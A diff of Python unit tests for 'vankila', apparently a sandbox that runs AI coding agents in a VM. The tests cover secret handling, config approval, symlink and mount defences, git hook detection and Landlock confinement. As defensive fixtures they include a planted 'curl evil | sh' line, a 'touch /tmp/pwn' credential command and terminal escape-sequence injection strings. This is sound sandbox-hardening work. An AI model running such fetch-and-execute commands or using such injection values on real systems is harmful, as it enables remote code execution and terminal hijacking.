@@ -6,16 +6,19 @@ import os
 import subprocess
 import sys
 import tempfile
+import tarfile
 import tomllib
 import unittest
 from contextlib import redirect_stderr
+from datetime import datetime, timezone
 from pathlib import Path
 from unittest import mock
 
 ROOT = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(ROOT / "src"))
 
-from vankila import cli, config, seed, smol, trust  # noqa: E402
+from vankila import cli, config, confine, sandbox, seed, smol, trust  # noqa: E402
+from vankila import ui  # noqa: E402
 from vankila.ui import Fail  # noqa: E402
 
 
@@ -39,6 +42,7 @@ class Env(unittest.TestCase):
             "VANKILA_SMOLVM": str(fake),
             "FAKE_SMOL_STATE": str(self.state_file),
             "GH_TOKEN": "",
+            "VANKILA_NO_CONFINE": "1",
         }
         patcher = mock.patch.dict(os.environ, env)
         patcher.start()
@@ -64,9 +68,25 @@ class Env(unittest.TestCase):
     def creates(self):
         return [c for c in self.calls("machine", "create") if "--from" in c["argv"]]
 
+    def apply_harness(self, project, api_key=None, into=None):
+        """Run the guest-side script here, on stand-ins for the guest's directories."""
+        base = Path(tempfile.mkdtemp(dir=self.tmp.name))
+        claude, pi = into or (base / "claude", base / "pi")
+        claude.mkdir(exist_ok=True)
+        pi.mkdir(exist_ok=True)
+        staging = base / "staging"
+        data = seed.harness_tar(project, api_key, os.getuid(), os.getgid())
+        with tarfile.open(fileobj=io.BytesIO(data)) as tar:
+            tar.extractall(staging, filter="data")
+        payload = json.loads((staging / "payload.json").read_text())
+        payload.update(claude_dir=str(claude), pi_dir=str(pi), project_root=str(project.root))
+        (staging / "payload.json").write_text(json.dumps(payload))
+        subprocess.run([sys.executable, "-I", str(staging / "apply_harness.py"), str(staging)], check=True)
+        return claude, pi
+
     def write_config(self, text):
         (self.project / "vankila.toml").write_text(text)
-        trust.record(config.load_project(self.project, read_project_file=False))
+        trust.record(config.load_project(self.project, read_project_file=False), text)
 
 
 class FirstRun(Env):
@@ -103,8 +123,10 @@ class FirstRun(Env):
 
 class Secrets(Env):
     def test_secret_only_in_start_env_never_in_args(self):
+        from vankila.secrets import save_secret
+
         os.environ["ANTHROPIC_API_KEY"] = "sk-real-secret"
-        os.environ["GH_TOKEN"] = "ghp-real-secret"
+        save_secret("github", "ghp-real-secret")
         self.assertEqual(self.vk("true"), 0)
         data = json.loads(self.state_file.read_text())
         for call in data["calls"]:
@@ -145,17 +167,136 @@ class Secrets(Env):
         self.assertEqual(tail, ["env", "-u", "ANTHROPIC_API_KEY", "claude",
                                 "--dangerously-skip-permissions", "--help"])
 
+    def test_github_token_is_not_picked_up_implicitly(self):
+        os.environ["GH_TOKEN"] = "ghp-ambient"
+        with mock.patch("vankila.secrets._run_command", return_value="ghp-from-gh") as gh:
+            self.assertEqual(self.vk("true"), 0)
+        gh.assert_not_called()
+        self.assertFalse([a for a in self.creates()[-1]["argv"] if a.startswith("github=")])
+        self.assertIn("vk auth github", self.output)
+
+    def test_github_token_from_gh_needs_an_explicit_setting(self):
+        self.write_config('[auth]\ngithub = "gh"\n')
+        with mock.patch("vankila.secrets._run_command", return_value="ghp-from-gh"):
+            self.assertEqual(self.vk("true"), 0)
+        self.assertIn("github=GH_TOKEN@api.github.com", self.creates()[-1]["argv"])
+        self.assertIn("gh auth token", self.output)
+
+    def test_doctor_does_not_fail_for_a_missing_github_token(self):
+        from vankila.secrets import save_secret
+
+        save_secret("anthropic", "x")
+        with mock.patch("vankila.cli.check_kvm"):
+            self.assertEqual(self.vk("build"), 0)
+            self.assertEqual(self.vk("doctor"), 0)
+
     def test_claude_first_run_prompts_are_preseeded(self):
         os.environ["ANTHROPIC_API_KEY"] = "a"
         self.assertEqual(self.vk("true"), 0)
-        project = config.load_project(self.project)
-        state = json.loads((project.state_dir / "claude" / ".claude.json").read_text())
+        claude, _ = self.apply_harness(config.load_project(self.project), "SMOL_PLACEHOLDER_abcdefghijklmnopqrstuvwxyz")
+        state = json.loads((claude / ".claude.json").read_text())
         self.assertTrue(state["hasCompletedOnboarding"])
         self.assertTrue(state["projects"]["/workspace/demo"]["hasTrustDialogAccepted"])
         self.assertEqual(state["customApiKeyResponses"]["approved"], ["ghijklmnopqrstuvwxyz"])
 
 
 class Trust(Env):
+    def tty(self, answer):
+        return (mock.patch("sys.stdin.isatty", return_value=True),
+                mock.patch("builtins.input", side_effect=answer))
+
+    def test_load_uses_the_bytes_that_were_checked(self):
+        good = '[network]\npresets = ["npm"]\n'
+        self.write_config(good)
+        real_read = trust.read_project_file
+
+        def swap_after_read(root):
+            text = real_read(root)
+            (root / "vankila.toml").write_text('[network]\npresets = ["claude"]\n')
+            return text
+
+        with mock.patch("vankila.trust.read_project_file", swap_after_read):
+            project = trust.load_approved(self.project)
+        self.assertEqual(project.config["network"]["presets"], ["npm"])
+
+    def test_approval_records_what_was_shown_not_what_is_on_disk_now(self):
+        shown = "[network]\nallow = []\n"
+        (self.project / "vankila.toml").write_text(shown)
+        evil = '[credentials.x]\nenv="X"\nhosts=["e.example.com"]\ncommand="touch /tmp/pwn"\n'
+
+        def answer_while_guest_edits(_prompt):
+            (self.project / "vankila.toml").write_text(evil)
+            return "y"
+
+        isatty, _ = self.tty([])
+        with isatty, mock.patch("builtins.input", answer_while_guest_edits), redirect_stderr(io.StringIO()):
+            project = trust.load_approved(self.project)
+        self.assertEqual(project.config["credentials"], {})
+        self.assertEqual(trust.approved_text(project), shown)
+        self.assertEqual(self.vk("true"), 1)
+        self.assertIn("needs approval", self.output)
+
+    def test_deleted_config_is_a_change_without_a_tty(self):
+        self.write_config('[network]\npresets = ["npm"]\n')
+        self.assertEqual(self.vk("true"), 0)
+        calls = len(self.calls("machine", "update"))
+        (self.project / "vankila.toml").unlink()
+        self.assertEqual(self.vk("true"), 1)
+        self.assertIn("deleted", self.output)
+        self.assertEqual(len(self.calls("machine", "update")), calls)
+
+    def test_declining_a_deletion_stops_and_accepting_clears_it(self):
+        self.write_config('[network]\npresets = ["npm"]\n')
+        (self.project / "vankila.toml").unlink()
+        isatty, answer = self.tty(["n"])
+        with isatty, answer:
+            self.assertEqual(self.vk("true"), 1)
+        self.assertFalse(self.state_file.exists())
+        isatty, answer = self.tty(["y"])
+        with isatty, answer:
+            self.assertEqual(self.vk("true"), 0)
+        self.assertEqual(self.vk("true"), 0)
+
+    def test_deleting_a_config_can_not_silently_move_the_root_up(self):
+        (self.project / ".git").mkdir()
+        sub = self.project / "sub"
+        sub.mkdir()
+        os.chdir(sub)
+        text = '[network]\npresets = ["npm"]\n'
+        (sub / "vankila.toml").write_text(text)
+        trust.record(config.load_project(sub, read_project_file=False), text)
+        (sub / "vankila.toml").unlink()
+        self.assertEqual(self.vk("true"), 1)
+        self.assertIn("deleted", self.output)
+
+    def test_prompt_shows_escape_sequences_harmlessly(self):
+        (self.project / "vankila.toml").write_text('# \x1b]52;c;aGk=\x07\n')
+        isatty, answer = self.tty(["n"])
+        with isatty, answer:
+            self.assertEqual(self.vk("true"), 1)
+        self.assertNotIn("\x1b", self.output)
+        self.assertIn("\\x1b", self.output)
+
+    def test_allow_refuses_a_guest_edit_after_the_check(self):
+        self.write_config("[network]\nallow = []\n")
+        project = trust.load_approved(self.project)
+        (self.project / "vankila.toml").write_text('[credentials.x]\nenv="X"\nhosts=["e.example.com"]\n')
+        with redirect_stderr(io.StringIO()), self.assertRaisesRegex(Fail, "changed"):
+            cli.cmd_allow(project, ["api.stripe.com"], False)
+        self.assertNotIn("credentials", trust.approved_text(project))
+
+    def test_allow_failure_leaves_the_file_alone(self):
+        text = "[network]\nallow = []\n"
+        self.write_config(text)
+        self.assertEqual(self.vk("allow", "not a host"), 1)
+        self.assertEqual((self.project / "vankila.toml").read_text(), text)
+
+    def test_init_does_not_write_through_a_dangling_symlink(self):
+        victim = self.home / "victim"
+        (self.project / "vankila.toml").symlink_to(victim)
+        self.assertEqual(self.vk("init"), 0)
+        self.assertFalse(victim.exists())
+
     def test_unapproved_config_is_refused_without_a_tty(self):
         (self.project / "vankila.toml").write_text('[sandbox]\nmounts = ["~/.ssh:/x"]\n')
         self.assertEqual(self.vk("true"), 1)
@@ -227,47 +368,92 @@ class Drift(Env):
 class GuestStateIsUntrusted(Env):
     def setUp(self):
         super().setUp()
-        self.root = Path(self.tmp.name) / "guest-state"
-        self.root.mkdir()
         self.victim = Path(self.tmp.name) / "victim"
         self.victim.write_text("original")
 
-    def test_write_replaces_a_planted_symlink_without_following(self):
-        (self.root / "settings.json").symlink_to(self.victim)
-        seed.safe_write(self.root, "settings.json", b"new")
-        self.assertEqual(self.victim.read_text(), "original")
-        self.assertFalse((self.root / "settings.json").is_symlink())
+    def state_tree(self, project):
+        out = {}
+        for directory, subdirs, names in os.walk(project.state_dir / "pi"):
+            for name in subdirs + names:
+                path = Path(directory) / name
+                out[str(path)] = os.readlink(path) if path.is_symlink() else path.is_dir()
+        return out
 
-    def test_write_refuses_a_symlinked_directory(self):
-        outside = Path(self.tmp.name) / "outside"
+    def test_vk_does_not_write_through_a_planted_pi_symlink(self):
+        """The audit's V1: a guest symlink must not redirect a host-side write."""
+        self.write_config('[harness.pi]\nsettings = { defaultProvider = "x" }\n')
+        overlay = self.project / ".vankila" / "harness" / "pi"
+        overlay.mkdir(parents=True)
+        (overlay / ".bashrc").write_text("curl evil | sh\n")
+        self.assertEqual(self.vk("true"), 0)
+        project = config.load_project(self.project)
+        outside = self.home / "outside"
         outside.mkdir()
-        (self.root / "skills").symlink_to(outside)
-        with self.assertRaises(Fail):
-            seed.safe_write(self.root, "skills/x.md", b"new")
+        (project.state_dir / "pi").mkdir(exist_ok=True)
+        (project.state_dir / "pi" / "agent").symlink_to(outside)
+        before = self.state_tree(project)
+        self.assertEqual(self.vk("true"), 0)
         self.assertEqual(list(outside.iterdir()), [])
+        self.assertEqual(self.state_tree(project), before)
 
-    def test_read_ignores_symlink_and_garbage(self):
-        (self.root / "a.json").symlink_to(self.victim)
-        self.assertEqual(seed.safe_read_json(self.root, "a.json"), {})
-        (self.root / "b.json").write_text("{nope")
-        self.assertEqual(seed.safe_read_json(self.root, "b.json"), {})
-        (self.root / "c.json").write_text("[1]")
-        self.assertEqual(seed.safe_read_json(self.root, "c.json"), {})
-
-    def test_project_overlay_does_not_copy_symlinked_host_files(self):
+    def test_vk_does_not_read_a_planted_project_overlay_on_the_host(self):
         overlay = self.project / ".vankila" / "harness" / "claude"
         overlay.mkdir(parents=True)
-        (overlay / "CLAUDE.md").write_text("hello")
         (overlay / "stolen").symlink_to(self.victim)
         project = config.load_project(self.project)
-        seed.write_harness_state(project)
-        claude = project.state_dir / "claude"
-        self.assertEqual((claude / "CLAUDE.md").read_text(), "hello")
-        self.assertFalse((claude / "stolen").exists())
+        data = seed.harness_tar(project, None, os.getuid(), os.getgid())
+        self.assertNotIn(b"original", data)
+
+    def test_harness_is_delivered_to_a_running_vm_too(self):
+        self.write_config("[sandbox]\nkeep_running = true\n")
+        self.assertEqual(self.vk("true"), 0)
+        self.assertEqual(self.vk("true"), 0)
+        delivered = [c for c in self.calls("machine", "exec") if seed.APPLY_HARNESS_COMMAND in c["argv"]]
+        self.assertEqual(len(delivered), 2)
+        starts = [c for c in self.calls("machine", "start") if "vankila-bake" not in " ".join(c["argv"])]
+        self.assertEqual(len(starts), 1)
+
+    def test_guest_script_copies_overlays_but_not_symlinks(self):
+        overlay = self.project / ".vankila" / "harness" / "claude"
+        (overlay / "skills").mkdir(parents=True)
+        (overlay / "CLAUDE.md").write_text("project")
+        (overlay / "skills" / "a.md").write_text("skill")
+        (overlay / "stolen").symlink_to(self.victim)
+        global_overlay = config.config_home() / "harness" / "claude"
+        global_overlay.mkdir(parents=True)
+        (global_overlay / "CLAUDE.md").write_text("global")
+        (global_overlay / "GLOBAL.md").write_text("global")
+        claude, _ = self.apply_harness(config.load_project(self.project))
+        self.assertEqual((claude / "CLAUDE.md").read_text(), "project")
+        self.assertEqual((claude / "GLOBAL.md").read_text(), "global")
+        self.assertEqual((claude / "skills" / "a.md").read_text(), "skill")
+        self.assertFalse(os.path.lexists(claude / "stolen"))
+
+    def test_guest_script_handles_a_dangling_planted_link(self):
+        project = config.load_project(self.project)
+        claude, pi = self.apply_harness(project)
+        target = Path(self.tmp.name) / "not-yet"
+        (pi / "agent").rmdir()
+        (pi / "agent").symlink_to(target)
+        self.apply_harness(project, into=(claude, pi))
+        self.assertTrue(target.is_dir())
+
+    def test_guest_script_merges_settings_and_survives_garbage(self):
+        self.write_config('[harness.pi]\nsettings = { defaultProvider = "x" }\n')
+        project = config.load_project(self.project)
+        claude, pi = self.apply_harness(project)
+        (claude / "settings.json").write_text('{"mine": 1, "env": {"KEEP": "1"}}')
+        (pi / "agent" / "settings.json").write_text("{nope")
+        (claude / ".claude.json").write_text("[1]")
+        self.apply_harness(project, into=(claude, pi))
+        settings = json.loads((claude / "settings.json").read_text())
+        self.assertEqual(settings["mine"], 1)
+        self.assertEqual(settings["env"]["KEEP"], "1")
+        self.assertEqual(settings["env"]["DISABLE_AUTOUPDATER"], "1")
+        self.assertEqual(json.loads((pi / "agent" / "settings.json").read_text()), {"defaultProvider": "x"})
+        self.assertTrue(json.loads((claude / ".claude.json").read_text())["hasCompletedOnboarding"])
 
     def test_git_hook_written_by_guest_is_reported(self):
-        from vankila import sandbox
-
         hooks = self.project / ".git" / "hooks"
         hooks.mkdir(parents=True)
         before = sandbox.git_fingerprint(self.project)
@@ -276,6 +462,205 @@ class GuestStateIsUntrusted(Env):
         with redirect_stderr(err):
             sandbox.report_git_changes(self.project, before)
         self.assertIn(".git/hooks/pre-commit", err.getvalue())
+
+
+class Mounts(Env):
+    def refused(self, path):
+        with self.assertRaisesRegex(Fail, "refusing to mount"):
+            config.check_mountable(Path(path).resolve())
+
+    def test_sensitive_paths_are_refused(self):
+        for name in (".ssh", ".ssh/keys", ".config", ".config/vankila", ".local", ".local/state", ".bashrc"):
+            self.refused(self.home / name)
+        for path in ("/etc", "/etc/ssl", "/usr", "/root", "/proc/self"):
+            self.refused(path)
+        self.refused(config.state_home())
+
+    def test_parents_of_sensitive_paths_are_refused(self):
+        self.refused(config.state_home().parent)
+
+    def test_ordinary_paths_are_allowed(self):
+        config.check_mountable(self.project.resolve())
+        config.check_mountable((self.home / ".cache" / "vk-selftest").resolve())
+
+    def test_sensitive_mount_is_refused_in_config(self):
+        self.write_config('[sandbox]\nmounts = ["~/.ssh:/x"]\n')
+        self.assertEqual(self.vk("true"), 1)
+        self.assertIn("refusing to mount", self.output)
+
+    def test_mount_swapped_for_a_symlink_is_refused_even_with_yes(self):
+        lib = self.project / "lib"
+        lib.mkdir()
+        self.write_config('[sandbox]\nmounts = ["./lib:/x"]\n')
+        self.assertEqual(self.vk("true"), 0)
+        lib.rmdir()
+        other = self.home / "other"
+        other.mkdir()
+        lib.symlink_to(other)
+        self.assertEqual(self.vk("-y", "true"), 1)
+        self.assertIn("symlink inside the project", self.output)
+        self.assertEqual(len(self.creates()), 1)
+
+    def test_recreate_shows_what_changed(self):
+        self.write_config("[sandbox]\ncpus = 2\n")
+        self.assertEqual(self.vk("true"), 0)
+        self.write_config("[sandbox]\ncpus = 8\n")
+        self.assertEqual(self.vk("-y", "true"), 0)
+        self.assertIn("cpus: 2 -> 8", self.output)
+
+
+class GitFingerprint(Env):
+    def test_worktree_hooks_and_pointer_are_covered(self):
+        main = self.home / "main.git"
+        (main / "worktrees" / "demo").mkdir(parents=True)
+        (main / "hooks").mkdir()
+        (main / "worktrees" / "demo" / "commondir").write_text("../..\n")
+        (self.project / ".git").write_text(f"gitdir: {main}/worktrees/demo\n")
+        before = sandbox.git_fingerprint(self.project)
+        self.assertIn(".git", before)
+        (main / "hooks" / "pre-commit").write_text("evil")
+        after = sandbox.git_fingerprint(self.project)
+        self.assertTrue(any(key.endswith("pre-commit") for key in after))
+
+    def test_submodule_hooks_are_covered(self):
+        module = self.project / ".git" / "modules" / "lib"
+        (module / "hooks").mkdir(parents=True)
+        (module / "HEAD").write_text("ref: refs/heads/main\n")
+        (module / "hooks" / "post-checkout").write_text("evil")
+        self.assertIn(".git/modules/lib/hooks/post-checkout", sandbox.git_fingerprint(self.project))
+
+    def test_symlinks_are_recorded_not_followed(self):
+        (self.project / ".git").mkdir()
+        outside = self.home / "outside"
+        outside.mkdir()
+        (outside / "hook").write_text("x")
+        (self.project / ".git" / "hooks").symlink_to(outside)
+        prints = sandbox.git_fingerprint(self.project)
+        self.assertEqual(prints[".git/hooks"], f"symlink:{outside}")
+        self.assertFalse([key for key in prints if key.endswith("hook")])
+
+    def test_a_fifo_does_not_hang(self):
+        hooks = self.project / ".git" / "hooks"
+        hooks.mkdir(parents=True)
+        os.mkfifo(hooks / "pre-commit")
+        self.assertEqual(sandbox.git_fingerprint(self.project)[".git/hooks/pre-commit"], "not-a-file")
+
+    def test_change_between_sessions_is_reported_with_keep_running(self):
+        hooks = self.project / ".git" / "hooks"
+        hooks.mkdir(parents=True)
+        self.write_config("[sandbox]\nkeep_running = true\n")
+        self.assertEqual(self.vk("true"), 0)
+        (hooks / "pre-commit").write_text("written while no session was open")
+        self.assertEqual(self.vk("true"), 0)
+        self.assertIn(".git/hooks/pre-commit", self.output)
+        self.assertEqual(self.vk("true"), 0)
+        self.assertNotIn(".git/hooks/pre-commit", self.output)
+
+    def test_hook_name_is_printed_safely(self):
+        hooks = self.project / ".git" / "hooks"
+        hooks.mkdir(parents=True)
+        before = sandbox.git_fingerprint(self.project)
+        (hooks / "a\x1b]52;c;aGk=\x07").write_text("x")
+        err = io.StringIO()
+        with redirect_stderr(err):
+            sandbox.report_git_changes(self.project, before)
+        self.assertNotIn("\x1b", err.getvalue())
+
+
+class SafetyNets(Env):
+    def test_snapshot_copies_without_following_symlinks_and_is_pruned(self):
+        secret = self.home / "secret"
+        secret.write_text("host secret")
+        (self.project / "work").write_text("v1")
+        (self.project / "link").symlink_to(secret)
+        self.write_config("[sandbox]\nsnapshot = true\n")
+        for _ in range(sandbox.SNAPSHOTS_KEPT + 1):
+            self.assertEqual(self.vk("true"), 0)
+        snapshots = sorted((config.load_project(self.project).state_dir / "snapshots").iterdir())
+        self.assertEqual(len(snapshots), sandbox.SNAPSHOTS_KEPT)
+        self.assertEqual((snapshots[-1] / "work").read_text(), "v1")
+        self.assertTrue((snapshots[-1] / "link").is_symlink())
+
+    def test_no_snapshot_while_the_vm_is_running(self):
+        self.write_config("[sandbox]\nsnapshot = true\nkeep_running = true\n")
+        self.assertEqual(self.vk("true"), 0)
+        self.assertEqual(self.vk("true"), 0)
+        snapshots = list((config.load_project(self.project).state_dir / "snapshots").iterdir())
+        self.assertEqual(len(snapshots), 1)
+
+    def test_low_disk_warns(self):
+        usage = mock.Mock(free=1024)
+        err = io.StringIO()
+        with mock.patch("shutil.disk_usage", return_value=usage), redirect_stderr(err):
+            sandbox.report_low_disk(self.project)
+        self.assertIn("left on the disk", err.getvalue())
+
+
+class SafePrinting(Env):
+    DENIAL = "evil\x1b]52;c;aGk=\x07.example.com:443"
+
+    def test_denials_are_printed_safely(self):
+        data = {"machines": {}, "calls": [], "denials": [{"dest": self.DENIAL, "operation": "tcp"}]}
+        self.state_file.write_text(json.dumps(data))
+        self.assertEqual(self.vk("blocked"), 0)
+        self.assertNotIn("\x1b", self.output)
+        err = io.StringIO()
+        with redirect_stderr(err):
+            sandbox.report_denials(smol.Smol(), config.load_project(self.project), datetime(2000, 1, 1, tzinfo=timezone.utc))
+        self.assertNotIn("\x1b", err.getvalue())
+        self.assertNotIn("vk allow", err.getvalue())
+
+    def test_clean_escapes_bidi_and_keeps_text(self):
+        self.assertEqual(ui.clean("a\u202eb\tc é"), "a\\u202eb\tc é")
+
+
+@unittest.skipUnless(confine.abi_version() >= 1, "needs Landlock")
+class Confinement(Env):
+    def probe(self, code, read_only=(), read_write=()):
+        spec = {"read_only": ["/usr", "/lib", "/lib64", "/etc", *read_only], "read_write": list(read_write)}
+        return subprocess.run(
+            confine.wrapper_command(spec, [sys.executable, "-I", "-c", code]),
+            capture_output=True, text=True, check=False,
+        )
+
+    def test_blocks_what_was_not_granted_and_allows_what_was(self):
+        secret = self.home / "secret"
+        secret.write_text("x")
+        allowed = self.home / "allowed"
+        allowed.mkdir()
+        denied = self.probe(f"open({str(secret)!r}).read()")
+        self.assertNotEqual(denied.returncode, 0)
+        self.assertIn("PermissionError", denied.stderr)
+        written = self.probe(f"open({str(allowed / 'f')!r}, 'w').write('ok')", read_write=[str(allowed)])
+        self.assertEqual(written.returncode, 0, written.stderr)
+
+    def test_read_only_path_can_not_be_written(self):
+        allowed = self.home / "ro"
+        allowed.mkdir()
+        result = self.probe(f"open({str(allowed / 'f')!r}, 'w')", read_only=[str(allowed)])
+        self.assertIn("PermissionError", result.stderr)
+
+    def test_can_not_read_another_process_environment(self):
+        result = self.probe(f"open('/proc/{os.getpid()}/environ').read()", read_only=["/proc"])
+        self.assertNotEqual(result.returncode, 0)
+
+    def test_start_uses_the_wrapper_and_keeps_secrets_out_of_argv(self):
+        del os.environ["VANKILA_NO_CONFINE"]
+        client = smol.Smol("/bin/true")
+        with mock.patch("subprocess.run", return_value=mock.Mock(returncode=0)) as run:
+            client.start("vm", {"TOKEN": "real-secret"}, ["/rw"], ["/ro"])
+        argv, kwargs = run.call_args[0][0], run.call_args[1]
+        self.assertIn("confine.py", argv[2])
+        self.assertNotIn("real-secret", " ".join(argv))
+        self.assertEqual(kwargs["env"]["TOKEN"], "real-secret")
+
+    def test_no_landlock_warns_and_still_starts(self):
+        del os.environ["VANKILA_NO_CONFINE"]
+        client = smol.Smol("/bin/true")
+        err = io.StringIO()
+        with mock.patch("vankila.confine.abi_version", return_value=0), redirect_stderr(err):
+            client.start("vm", {}, [], [])
+        self.assertIn("not confined", err.getvalue())
 
 
 class SmolvmInstall(Env):
